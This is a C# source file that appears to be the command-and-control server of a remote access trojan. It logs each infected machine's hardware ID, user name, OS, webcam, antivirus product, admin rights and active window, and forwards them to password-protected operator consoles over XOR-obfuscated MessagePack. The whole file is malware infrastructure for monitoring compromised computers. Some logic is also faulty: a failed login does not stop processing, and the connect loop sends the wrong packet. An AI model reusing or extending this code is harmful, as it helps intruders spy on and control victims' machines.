using MessagePack;
using System;
using System.Diagnostics;
using System.Linq;
using System.Threading;

namespace Server
{
    public class HandlePacket
    {
        public Clients client;
        public byte[] data;

        public void Read(object o)
        {
            try
            {
                MsgPack unpack_msgpack = new MsgPack();
                unpack_msgpack.DecodeFromBytes(Helper.Xor(data));

                if (unpack_msgpack.ForcePathObject("Type").AsString== "Controler")
                {
                    if (unpack_msgpack.ForcePathObject("Password").AsString != Settings.Password)
                    {
                        Console.WriteLine("Error password trying to login from"+client.Info.IP);
                        client.Disconnected();
                    }
                    switch (unpack_msgpack.ForcePathObject("Packet").AsString)
                    {
                        case "Connect":
                            {
                                Console.WriteLine("Login from " + client.Info.IP);
                                Settings.Controler.Add(client);
                                client.Controler = true;
                                if (Settings.Online.Count > 0)
                                {
                                    foreach (Clients clients in Settings.Online)
                                    {
                                        MsgPack msgpack = new MsgPack();
                                        msgpack.ForcePathObject("Packet").AsString = "ClientInfo";
                                        msgpack.ForcePathObject("IP").AsString = clients.Info.IP;
                                        msgpack.ForcePathObject("HWID").AsString = clients.Info.HWID;
                                        msgpack.ForcePathObject("User").AsString = clients.Info.User;
                                        msgpack.ForcePathObject("OS").AsString = clients.Info.OS;
                                        msgpack.ForcePathObject("Camera").SetAsBoolean(clients.Info.Camera);
                                        msgpack.ForcePathObject("Path").AsString = clients.Info.Path;
                                        msgpack.ForcePathObject("Version").AsString = clients.Info.Version;
                                        msgpack.ForcePathObject("Admin").AsString = clients.Info.Permission;
                                        msgpack.ForcePathObject("Active").AsString = clients.Info.Active; 
                                        msgpack.ForcePathObject("AV").AsString = clients.Info.AV;
                                        msgpack.ForcePathObject("Install-Type").AsInteger = clients.Info.InstallType;
                                        msgpack.ForcePathObject("Install-Time").AsString = clients.Info.InstallTime;
                                        msgpack.ForcePathObject("Group").AsString = clients.Info.Group;
                                        ThreadPool.QueueUserWorkItem(client.BeginSend, unpack_msgpack.Encode2Bytes());
                                    }
                                }
                            }
                            break;
                        case "Ping":
                            {
                                Console.WriteLine("Ping from controler " + client.Info.IP);
                                client.LastPing = DateTime.Now;
                            }
                            break;
                        case "Command": 
                            {

                            }
                            break;
                        case "Error":
                            {

                            }
                            break;
                        case "Log":
                            {

                            }
                            break;
                        
                        default:
                            {

                            }
                            break;
                    }                    
                }
                else
                {
                    switch (unpack_msgpack.ForcePathObject("Packet").AsString)
                    {
                        case "ClientInfo":
                            {
                                Console.WriteLine("------------------------------");
                                Console.WriteLine();
                                Console.WriteLine("New connection established!");
                                Console.WriteLine();
                                Console.WriteLine("HWID:" + unpack_msgpack.ForcePathObject("HWID").AsString);
                                Console.WriteLine("User Name:" + unpack_msgpack.ForcePathObject("User").AsString);
                                Console.WriteLine("OS Version:" + unpack_msgpack.ForcePathObject("OS").AsString);
                                Console.WriteLine("Camera:" + unpack_msgpack.ForcePathObject("Camera").AsString);
                                Console.WriteLine("Path:" + unpack_msgpack.ForcePathObject("Path").AsString);
                                Console.WriteLine("Version:" + unpack_msgpack.ForcePathObject("Version").AsString);
                                Console.WriteLine("Permission:" + unpack_msgpack.ForcePathObject("Permission").GetAsInteger());
                                Console.WriteLine("Anti-Virus Product:" + unpack_msgpack.ForcePathObject("AV").AsString);
                                Console.WriteLine("Group:" + unpack_msgpack.ForcePathObject("Group").AsString);
                                Console.WriteLine("Active Window:" + unpack_msgpack.ForcePathObject("Active").AsString);



                                client.Info.HWID = unpack_msgpack.ForcePathObject("HWID").AsString;
                                client.Info.User = unpack_msgpack.ForcePathObject("User").AsString;
                                client.Info.OS = unpack_msgpack.ForcePathObject("OS").AsString;
                                client.Info.Camera = Convert.ToBoolean(unpack_msgpack.ForcePathObject("Camera").AsString);
                                client.Info.InstallType = unpack_msgpack.ForcePathObject("Install-Type").GetAsInteger();
                                client.Info.InstallTime = unpack_msgpack.ForcePathObject("Install-Time").AsString;
                                client.Info.Path = unpack_msgpack.ForcePathObject("Path").AsString;
                                client.Info.Version = unpack_msgpack.ForcePathObject("Version").AsString;
                                client.Info.Permission = unpack_msgpack.ForcePathObject("Admin").AsString;
                                client.Info.AV = unpack_msgpack.ForcePathObject("AV").AsString;
                                client.Info.Group = unpack_msgpack.ForcePathObject("Group").AsString;
                                client.Info.Active = unpack_msgpack.ForcePathObject("Active").AsString;
                                client.Info.LastPing = DateTime.Now; ;

                                if (Settings.Controler.Count > 0)
                                {
                                    unpack_msgpack.ForcePathObject("IP").AsString = client.Info.IP;
                                    foreach (Clients clients in Settings.Controler)
                                    {
                                        ThreadPool.QueueUserWorkItem(clients.BeginSend, unpack_msgpack.Encode2Bytes());
                                    }
                                }

                                client.Controler = false;

                                Settings.Online.Add(client);
                            }
                            break;

                        case "Ping":
                            {
                                client.LastPing = DateTime.Now;
                                client.Info.Active = unpack_msgpack.ForcePathObject("Message").AsString;
                                if (Settings.Controler.Count > 0)
                                {
                                    foreach (Clients clients in Settings.Controler)
                                    {
                                        ThreadPool.QueueUserWorkItem(clients.BeginSend, unpack_msgpack.Encode2Bytes());
                                    }
                                }
                            }
                            break;

                        default:
                            {

                            }
                            break;
                    }
                }                
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message);
            }
        }
    }
}
